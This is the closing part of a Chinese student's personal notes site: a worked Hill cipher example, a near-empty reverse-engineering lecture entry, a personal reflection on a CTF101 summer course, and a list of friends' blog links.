<td>c</td>
</tr>
</tbody>
</table>
<p>因此得到的密文为<span class="arithmatex">\(\texttt{cp srtbiyoac}\)</span></p>
<h3 id="note-ctf-crypto-hill">Hill密码<a class="headerlink" href="#note-ctf-crypto-hill" title="Permanent link">&para;</a></h3>
<p>希尔密码是运用基本线性代数原理实现的替换密码</p>
<p>每个字母当作26进制数字，将一串字母当成 <span class="arithmatex">\(n\)</span> 维向量，与一个 <span class="arithmatex">\(n \times n\)</span> 的矩阵相乘，再将得出的结果 mod 26，其中这个 <span class="arithmatex">\(n \times n\)</span> 矩阵就是密钥</p>
<p>比如明文 <span class="arithmatex">\(\texttt{IT}\)</span> ，转换成26进制为$P = \begin{bmatrix} 9 &amp; 20 \end{bmatrix} $，加密密钥
$ K = \begin{bmatrix}
11 &amp; 8 \\
3 &amp; 7
\end{bmatrix} $</p>
<p>密文即为$ C = P \times K = \begin{bmatrix} 159 &amp; 212 \end{bmatrix}\mod 26 = \begin{bmatrix} 3 &amp; 4 \end{bmatrix} $，转回字母即 $\texttt{CD} $
解密只需要计算 <span class="arithmatex">\(K\)</span> 的逆矩阵即可，$ P = C \times K^{-1} = \begin{bmatrix} 3 &amp; 4 \end{bmatrix} \times
\begin{bmatrix}
7 &amp; 18 \\
23 &amp; 11
\end{bmatrix} = \begin{bmatrix} 9 &amp; 20 \end{bmatrix} $，再转回字母即 $\texttt{IT} $</p></section><section class="print-page" id="note-ctf-reverse" heading-number="2.5.1.5"><h1 id="note-ctf-reverse-note-ctf-reverse">Reverse</h1><div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 13 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<h2 id="note-ctf-reverse-7-5-lec4-reverse">7-5 lec4-reverse<a class="headerlink" href="#note-ctf-reverse-7-5-lec4-reverse" title="Permanent link">&para;</a></h2>
<blockquote>
<p>授课：我没听</p>
<p>我去长沙玩辣</p>
</blockquote></section><section class="print-page" id="note-ctf-%e7%bb%93%e8%af%be%e5%bf%83%e5%be%97" heading-number="2.5.1.6"><h1 id="note-ctf-%e7%bb%93%e8%af%be%e5%bf%83%e5%be%97-_1">短学期结课心得<a class="headerlink" href="#note-ctf-%e7%bb%93%e8%af%be%e5%bf%83%e5%be%97-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 592 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 2 分钟</p>
</div>
<blockquote>
<p>回来吧我的matlab<img alt="😭" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f62d.svg" title=":sob:" />(x)</p>
</blockquote>
<p>现在是2024年7月24日,北京时间晚上23：08分,刚农了几把,四负一胜,淦！</p>
<p>洗了个澡，Crypto的专题一的lab今天截至，交了，专题二的27号才交，还不想写，闲来无事，写一个上这门课的感受吧。</p>
<p>课，是好的，我，是菜的。真的难，但是做出来的瞬间也是真的爽，CTF对自学能力要求很高，如果喜欢填鸭式教育，喜欢老师把知识嚼碎了喂到嘴里的话，是万万不可选的。这个月为了CTF不知道往电脑里面塞了多少小玩意。（也往脑子里面塞了很多东西）</p>
<p>选了Misc和Crypto两个方向，与其说真的感兴趣，不如说这两个对于二进制的要求的比较低。Web嘛，兴趣不大。</p>
<p>Misc是真的好玩，7月3日刚到长沙那晚就被OSINT迷得不行，开盒，爽。也对编解码有了豁然开朗的认识。专题一的三道图片隐写感觉偏向工具使用，spetrogram比较迷人，从gif到音频，从0开始的python学习，让我享受的是全心全意投入知识的感觉，“用眼睛听音乐”，当旋律在耳中响起，似乎我也能与傅里叶产生些许共鸣，但是由于一开始没注意到使用的python版本导致只能跑出来一个着实有点高血压。Misc专题二是区块链和以太坊，全新的的领域，也是有点好玩的，但是掌握可能没这么快，后面可能还会再看看吧</p>
<p>Crypto只有lab0和维吉尼亚密码是顺畅做下去的，HSC线代的方面没拐过弯来，专题二更是折磨中的折磨，不过好在今天总算是做完了。</p>
<p>虽然总是和同学吐槽后悔不选matlab那个水水的，但是CTF101的的确确让我学到很多的东西，
但就做题过程中学会的python各种库的骚操作就够开一门课的感觉……也让我直观的感受到计算机这个专业还有那么多，那么广的，那么深的领域我从未涉足。虽然累吧，但总之受益匪浅。</p>
<p>完结撒花~<img alt="💫" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f4ab.svg" title=":dizzy:" /></p></section></section></section></section><section class="print-page" id="friends" heading-number="3"><h1 id="friends-my-friends">My Friends<a class="headerlink" href="#friends-my-friends" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 117 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<div class="nt-cards nt-grid cols-3">
<div class="nt-card"><a href="https://shrike505.cc"><div><div class="nt-card-image tags"><img alt="Shrike-505" src="../static/images/PP.png" /></div><div class="nt-card-content"><p class="nt-card-title">Shrike-505</p><p class="nt-card-text">文豪伯劳先生</p></div></div></a></div>
<div class="nt-card"><a href="https://xestray.cc"><div><div class="nt-card-image tags"><img alt="Xestray" src="../static/images/xestray.png" /></div><div class="nt-card-content"><p class="nt-card-title">Xestray</p><p class="nt-card-text">这是一个卷哥</p></div></div></a></div>
<div class="nt-card"><a href="https://xecades.xyz"><div><div class="nt-card-image tags"><img alt="Xecades" src="../static/images/Xecades.png" /></div><div class="nt-card-content"><p class="nt-card-title">Xecades</p><p class="nt-card-text">满船清梦压星河</p></div></div></a></div>
<div class="nt-card"><a href="https://zjuhcsn.github.io"><div><div class="nt-card-image tags"><img alt="WEDM" src="../static/images/CSN.png" /></div><div class="nt-card-content"><p class="nt-card-title">WEDM</p><p class="nt-card-text">杭城少年</p></div></div></a></div>
<div class="nt-card"><a href="https://note.v1ceversaa.cc/"><div><div class="nt-card-image tags"><img alt="V1ceVarsa" src="../static/images/V1CeVersa.png" /></div><div class="nt-card-content"><p class="nt-card-title">V1ceVarsa</p><p class="nt-card-text">未经审视的生活是不值得过的</p></div></div></a></div>
<div class="nt-card"><a href="https://clovers2333.github.io/Clovers-Blog/"><div><div class="nt-card-image tags"><img alt="Clovers" src="../static/images/Clovers.png" /></div><div class="nt-card-content"><p class="nt-card-title">Clovers</p><p class="nt-card-text">金将军！恩情！忠诚！！</p></div></div></a></div>
<div class="nt-card"><a href="https://santal0.github.io/"><div><div class="nt-card-image tags"><img alt="沈檀" src="../static/images/shentan.jpg" /></div><div class="nt-card-content"><p class="nt-card-title">沈檀</p><p class="nt-card-text">是沈檀的妙妙屋哦</p></div></div></a></div>
<div class="nt-card"><a href="https://labafan.cc/"><div><div class="nt-card-image tags"><img alt="Asteroid" src="../static/images/Asteroid.png" /></div><div class="nt-card-content"><p class="nt-card-title">Asteroid</p><p class="nt-card-text">行星撞地球</p></div></div></a></div>
</div></section></div><style>.print-site-enumerate-headings #index > h1:before { content: '1 ' }

                .print-site-enumerate-headings #index h2:before { content: '1.' counter(counter-index-2) ' ' }
                .print-site-enumerate-headings #index h2 {  counter-reset: counter-index-3 ;  counter-increment: counter-index-2 }
            
                .print-site-enumerate-headings #index h3:before { content: '1.' counter(counter-index-2) '.' counter(counter-index-3) ' ' }
                .print-site-enumerate-headings #index h3 {  counter-increment: counter-index-3 }
            
.print-site-enumerate-headings #section-2 > h1:before { content: '2 ' }
.print-site-enumerate-headings #note > h1:before { content: '2.1 ' }

                .print-site-enumerate-headings #note h2:before { content: '2.1.' counter(counter-note-2) ' ' }
                .print-site-enumerate-headings #note h2 {  counter-increment: counter-note-2 }
            
.print-site-enumerate-headings #section-2-2 > h1:before { content: '2.2 ' }
.print-site-enumerate-headings #section-2-2-1 > h1:before { content: '2.2.1 ' }
.print-site-enumerate-headings #note-db > h1:before { content: '2.2.1.1 ' }

.print-site-enumerate-headings #note-db-lec1 > h1:before { content: '2.2.1.2 ' }

.print-site-enumerate-headings #note-db-lec2 > h1:before { content: '2.2.1.3 ' }

.print-site-enumerate-headings #note-db-sql > h1:before { content: '2.2.1.4 ' }

.print-site-enumerate-headings #note-db-er > h1:before { content: '2.2.1.5 ' }

.print-site-enumerate-headings #note-db-lec7 > h1:before { content: '2.2.1.6 ' }

.print-site-enumerate-headings #note-db-lec8 > h1:before { content: '2.2.1.7 ' }

.print-site-enumerate-headings #note-db-indexing > h1:before { content: '2.2.1.8 ' }

.print-site-enumerate-headings #note-db-query > h1:before { content: '2.2.1.9 ' }

.print-site-enumerate-headings #note-db-optimization > h1:before { content: '2.2.1.10 ' }

.print-site-enumerate-headings #note-db-transaction > h1:before { content: '2.2.1.11 ' }

.print-site-enumerate-headings #note-db-concurrency > h1:before { content: '2.2.1.12 ' }

.print-site-enumerate-headings #note-db-recovery > h1:before { content: '2.2.1.13 ' }

.print-site-enumerate-headings #section-2-2-2 > h1:before { content: '2.2.2 ' }
.print-site-enumerate-headings #note-co > h1:before { content: '2.2.2.1 ' }

.print-site-enumerate-headings #note-co-wk1 > h1:before { content: '2.2.2.2 ' }

.print-site-enumerate-headings #note-co-wk3 > h1:before { content: '2.2.2.3 ' }

.print-site-enumerate-headings #note-co-wk2 > h1:before { content: '2.2.2.4 ' }

.print-site-enumerate-headings #note-co-wk4 > h1:before { content: '2.2.2.5 ' }

.print-site-enumerate-headings #note-co-wk5 > h1:before { content: '2.2.2.6 ' }

.print-site-enumerate-headings #note-co-wk6 > h1:before { content: '2.2.2.7 ' }

.print-site-enumerate-headings #section-2-2-3 > h1:before { content: '2.2.3 ' }
.print-site-enumerate-headings #note-ads > h1:before { content: '2.2.3.1 ' }

.print-site-enumerate-headings #note-ads-wk1 > h1:before { content: '2.2.3.2 ' }

.print-site-enumerate-headings #note-ads-wk2 > h1:before { content: '2.2.3.3 ' }

.print-site-enumerate-headings #note-ads-wk3_1 > h1:before { content: '2.2.3.4 ' }

.print-site-enumerate-headings #note-ads-wk3_2 > h1:before { content: '2.2.3.5 ' }

.print-site-enumerate-headings #note-ads-wk4 > h1:before { content: '2.2.3.6 ' }

.print-site-enumerate-headings #note-ads-wk5 > h1:before { content: '2.2.3.7 ' }

.print-site-enumerate-headings #note-ads-wk6 > h1:before { content: '2.2.3.8 ' }

.print-site-enumerate-headings #note-ads-wk7 > h1:before { content: '2.2.3.9 ' }

.print-site-enumerate-headings #note-ads-wk8 > h1:before { content: '2.2.3.10 ' }

.print-site-enumerate-headings #note-ads-wk9 > h1:before { content: '2.2.3.11 ' }

.print-site-enumerate-headings #note-ads-wk10 > h1:before { content: '2.2.3.12 ' }

.print-site-enumerate-headings #note-ads-wk11 > h1:before { content: '2.2.3.13 ' }

.print-site-enumerate-headings #note-ads-wk12 > h1:before { content: '2.2.3.14 ' }

.print-site-enumerate-headings #note-ads-wk13 > h1:before { content: '2.2.3.15 ' }

.print-site-enumerate-headings #note-ads-wk14 > h1:before { content: '2.2.3.16 ' }

.print-site-enumerate-headings #section-2-2-4 > h1:before { content: '2.2.4 ' }
.print-site-enumerate-headings #note-arch > h1:before { content: '2.2.4.1 ' }

.print-site-enumerate-headings #note-arch-chap1 > h1:before { content: '2.2.4.2 ' }

.print-site-enumerate-headings #note-arch-chap4 > h1:before { content: '2.2.4.3 ' }

.print-site-enumerate-headings #section-2-2-5 > h1:before { content: '2.2.5 ' }
.print-site-enumerate-headings #note-datamarket > h1:before { content: '2.2.5.1 ' }

.print-site-enumerate-headings #note-datamarket-gametheory > h1:before { content: '2.2.5.2 ' }

.print-site-enumerate-headings #note-datamarket-mab > h1:before { content: '2.2.5.3 ' }

.print-site-enumerate-headings #note-datamarket-shapley > h1:before { content: '2.2.5.4 ' }

.print-site-enumerate-headings #note-datamarket-auction > h1:before { content: '2.2.5.5 ' }

.print-site-enumerate-headings #note-datamarket-optauction > h1:before { content: '2.2.5.6 ' }

.print-site-enumerate-headings #note-datamarket-beyesian > h1:before { content: '2.2.5.7 ' }

.print-site-enumerate-headings #section-2-3 > h1:before { content: '2.3 ' }
.print-site-enumerate-headings #section-2-3-1 > h1:before { content: '2.3.1 ' }
.print-site-enumerate-headings #note-la-linear-algebra > h1:before { content: '2.3.1.1 ' }

.print-site-enumerate-headings #note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86 > h1:before { content: '2.3.1.2 ' }

.print-site-enumerate-headings #note-la-note > h1:before { content: '2.3.1.3 ' }

.print-site-enumerate-headings #note-la-eigenvalue > h1:before { content: '2.3.1.4 ' }

.print-site-enumerate-headings #section-2-3-2 > h1:before { content: '2.3.2 ' }
.print-site-enumerate-headings #note-probability > h1:before { content: '2.3.2.1 ' }

.print-site-enumerate-headings #note-probability-first > h1:before { content: '2.3.2.2 ' }

.print-site-enumerate-headings #note-probability-second > h1:before { content: '2.3.2.3 ' }

.print-site-enumerate-headings #note-probability-third > h1:before { content: '2.3.2.4 ' }

.print-site-enumerate-headings #note-probability-fourth > h1:before { content: '2.3.2.5 ' }

.print-site-enumerate-headings #note-probability-others > h1:before { content: '2.3.2.6 ' }

.print-site-enumerate-headings #section-2-3-3 > h1:before { content: '2.3.3 ' }
.print-site-enumerate-headings #note-ma > h1:before { content: '2.3.3.1 ' }

.print-site-enumerate-headings #section-2-3-4 > h1:before { content: '2.3.4 ' }
.print-site-enumerate-headings #note-physics > h1:before { content: '2.3.4.1 ' }

.print-site-enumerate-headings #note-physics-eletronic > h1:before { content: '2.3.4.2 ' }

.print-site-enumerate-headings #note-physics-magnetism > h1:before { content: '2.3.4.3 ' }

.print-site-enumerate-headings #note-physics-electrodynamincs > h1:before { content: '2.3.4.4 ' }

.print-site-enumerate-headings #note-physics-maxwell > h1:before { content: '2.3.4.5 ' }

.print-site-enumerate-headings #note-physics-light > h1:before { content: '2.3.4.6 ' }

.print-site-enumerate-headings #note-physics-quantum > h1:before { content: '2.3.4.7 ' }

.print-site-enumerate-headings #section-2-4 > h1:before { content: '2.4 ' }
.print-site-enumerate-headings #note-cs > h1:before { content: '2.4.1 ' }

.print-site-enumerate-headings #section-2-4-2 > h1:before { content: '2.4.2 ' }
.print-site-enumerate-headings #note-cs-tms > h1:before { content: '2.4.2.1 ' }

.print-site-enumerate-headings #note-cs-tms-overview-and-shell > h1:before { content: '2.4.2.2 ' }

.print-site-enumerate-headings #note-cs-tms-shell-tools-and-scripts > h1:before { content: '2.4.2.3 ' }

.print-site-enumerate-headings #note-cs-tms-data-wrangling > h1:before { content: '2.4.2.4 ' }

.print-site-enumerate-headings #note-cs-tms-command-line-environment > h1:before { content: '2.4.2.5 ' }

.print-site-enumerate-headings #note-cs-tms-debugging-and-profiling > h1:before { content: '2.4.2.6 ' }

.print-site-enumerate-headings #note-cs-tms-metaprogramming > h1:before { content: '2.4.2.7 ' }

.print-site-enumerate-headings #note-cs-tms-security-and-cryptography > h1:before { content: '2.4.2.8 ' }

.print-site-enumerate-headings #note-cs-tms-miscellaneous > h1:before { content: '2.4.2.9 ' }

.print-site-enumerate-headings #section-2-4-3 > h1:before { content: '2.4.3 ' }
.print-site-enumerate-headings #note-cs-git > h1:before { content: '2.4.3.1 ' }

.print-site-enumerate-headings #section-2-4-4 > h1:before { content: '2.4.4 ' }
.print-site-enumerate-headings #note-cs-verilog-verilog > h1:before { content: '2.4.4.1 ' }

.print-site-enumerate-headings #note-cs-rust-rust > h1:before { content: '2.4.4.2 ' }

.print-site-enumerate-headings #section-2-4-4-3 > h1:before { content: '2.4.4.3 ' }
.print-site-enumerate-headings #note-cs-asm-wk1 > h1:before { content: '2.4.4.3.1 ' }

.print-site-enumerate-headings #note-cs-asm-wk1_2 > h1:before { content: '2.4.4.3.2 ' }

.print-site-enumerate-headings #note-cs-asm-wk2 > h1:before { content: '2.4.4.3.3 ' }

.print-site-enumerate-headings #note-cs-asm-wk3 > h1:before { content: '2.4.4.3.4 ' }

.print-site-enumerate-headings #section-2-4-5 > h1:before { content: '2.4.5 ' }
.print-site-enumerate-headings #note-cs-cv > h1:before { content: '2.4.5.1 ' }

.print-site-enumerate-headings #note-cs-cv-lec1 > h1:before { content: '2.4.5.2 ' }

.print-site-enumerate-headings #note-cs-cv-lec2 > h1:before { content: '2.4.5.3 ' }

.print-site-enumerate-headings #note-cs-cv-lec3 > h1:before { content: '2.4.5.4 ' }

.print-site-enumerate-headings #note-cs-cv-lec4 > h1:before { content: '2.4.5.5 ' }

.print-site-enumerate-headings #note-cs-cv-lec5 > h1:before { content: '2.4.5.6 ' }

.print-site-enumerate-headings #note-cs-cv-lec6 > h1:before { content: '2.4.5.7 ' }

.print-site-enumerate-headings #note-cs-cv-lec7_8 > h1:before { content: '2.4.5.8 ' }

.print-site-enumerate-headings #note-cs-cv-lec9_10 > h1:before { content: '2.4.5.9 ' }

.print-site-enumerate-headings #note-cs-cv-lec11_12 > h1:before { content: '2.4.5.10 ' }

.print-site-enumerate-headings #note-cs-cv-lec13_15 > h1:before { content: '2.4.5.11 ' }

.print-site-enumerate-headings #note-cs-cv-lec16 > h1:before { content: '2.4.5.12 ' }

.print-site-enumerate-headings #note-cs-cv-lec17 > h1:before { content: '2.4.5.13 ' }

.print-site-enumerate-headings #note-cs-cv-lec21 > h1:before { content: '2.4.5.14 ' }

.print-site-enumerate-headings #section-2-4-6 > h1:before { content: '2.4.6 ' }
.print-site-enumerate-headings #note-language > h1:before { content: '2.4.6.1 ' }

.print-site-enumerate-headings #note-language-english > h1:before { content: '2.4.6.2 ' }

.print-site-enumerate-headings #section-2-5 > h1:before { content: '2.5 ' }
.print-site-enumerate-headings #section-2-5-1 > h1:before { content: '2.5.1 ' }
.print-site-enumerate-headings #note-ctf-ctf > h1:before { content: '2.5.1.1 ' }

.print-site-enumerate-headings #note-ctf-web > h1:before { content: '2.5.1.2 ' }

.print-site-enumerate-headings #note-ctf-misc > h1:before { content: '2.5.1.3 ' }

.print-site-enumerate-headings #note-ctf-crypto > h1:before { content: '2.5.1.4 ' }

.print-site-enumerate-headings #note-ctf-reverse > h1:before { content: '2.5.1.5 ' }

.print-site-enumerate-headings #note-ctf-%e7%bb%93%e8%af%be%e5%bf%83%e5%be%97 > h1:before { content: '2.5.1.6 ' }

.print-site-enumerate-headings #friends > h1:before { content: '3 ' }

                .print-site-enumerate-headings #friends h2:before { content: '3.' counter(counter-friends-2) ' ' }
                .print-site-enumerate-headings #friends h2 {  counter-reset: counter-friends-3 ;  counter-increment: counter-friends-2 }
            
                .print-site-enumerate-headings #friends h3:before { content: '3.' counter(counter-friends-2) '.' counter(counter-friends-3) ' ' }
                .print-site-enumerate-headings #friends h3 {  counter-increment: counter-friends-3 }
            </style>









  



  <form class="md-feedback" name="feedback" hidden>
    <fieldset>
      <legend class="md-feedback__title">
        
      </legend>
      <div class="md-feedback__inner">
        <div class="md-feedback__list">
          
            <button class="md-feedback__icon md-icon" type="submit" title="对您有帮助的话，给我一个star吧！" data-md-value="5">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M316.9 18c-5.3-11-16.5-18-28.8-18s-23.4 7-28.8 18L195 150.3 51.4 171.5c-12 1.8-22 10.2-25.7 21.7s-.7 24.2 7.9 32.7L137.8 329l-24.6 145.7c-2 12 3 24.2 12.9 31.3s23 8 33.8 2.3l128.3-68.5 128.3 68.5c10.8 5.7 23.9 4.9 33.8-2.3s14.9-19.3 12.9-31.3L438.5 329l104.2-103.1c8.6-8.5 11.7-21.2 7.9-32.7s-13.7-19.9-25.7-21.7l-143.7-21.2z"/></svg>
            </button>
          
            <button class="md-feedback__icon md-icon" type="submit" title="你想请我喝杯咖啡吗？" data-md-value="1">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M88 0C74.7 0 64 10.7 64 24c0 38.9 23.4 59.4 39.1 73.1l1.1 1c16.3 14.2 23.8 21.8 23.8 37.9 0 13.3 10.7 24 24 24s24-10.7 24-24c0-38.9-23.4-59.4-39.1-73.1l-1.1-1C119.5 47.7 112 40.1 112 24c0-13.3-10.7-24-24-24M32 192c-17.7 0-32 14.3-32 32v192c0 53 43 96 96 96h192c53 0 96-43 96-96h16c61.9 0 112-50.1 112-112s-50.1-112-112-112H32m352 64h16c26.5 0 48 21.5 48 48s-21.5 48-48 48h-16zM224 24c0-13.3-10.7-24-24-24s-24 10.7-24 24c0 38.9 23.4 59.4 39.1 73.1l1.1 1c16.3 14.2 23.8 21.8 23.8 37.9 0 13.3 10.7 24 24 24s24-10.7 24-24c0-38.9-23.4-59.4-39.1-73.1l-1.1-1C231.5 47.7 224 40.1 224 24"/></svg>
            </button>
          
        </div>
        <div class="md-feedback__note">
          
            <div data-md-value="5" hidden>
              
              
                
              
              
              
                
                
              
              <a href="https://github.com/kailqq/kailqq.github.io">
  <div class="button"  target="_blank">Give me a star⭐</div>
</a>
            </div>
          
            <div data-md-value="1" hidden>
              
              
                
              
              
              
                
                
              
              <div align="center"> <img src="/static/images/pay.png" width="200" height="200" /> </div>
            </div>
          
        </div>
      </div>
    </fieldset>
  </form>



                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  回到页面顶部
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2023 ~ now |  Kailqq
    </div>
  
  
</div>
      
        <div class="md-social">
  
    
    
    
    
    <a href="https://github.com/kailqq" target="_blank" rel="noopener" title="My GitHub" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
    <a href="tencent://message/?uin=2725913404&Site=Kailqq&Menu=yes" target="_blank" rel="noopener" title="QQ" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M433.754 420.445c-11.526 1.393-44.86-52.741-44.86-52.741 0 31.345-16.136 72.247-51.051 101.786 16.842 5.192 54.843 19.167 45.803 34.421-7.316 12.343-125.51 7.881-159.632 4.037-34.122 3.844-152.316 8.306-159.632-4.037-9.045-15.25 28.918-29.214 45.783-34.415-34.92-29.539-51.059-70.445-51.059-101.792 0 0-33.334 54.134-44.859 52.741-5.37-.65-12.424-29.644 9.347-99.704 10.261-33.024 21.995-60.478 40.144-105.779C60.683 98.063 108.982.006 224 0c113.737.006 163.156 96.133 160.264 214.963 18.118 45.223 29.912 72.85 40.144 105.778 21.768 70.06 14.716 99.053 9.346 99.704"/></svg>
    </a>
  
    
    
    
    
    <a href="https://steamcommunity.com/profiles/76561199513750344" target="_blank" rel="noopener" title="Steam" class="md-social__link">
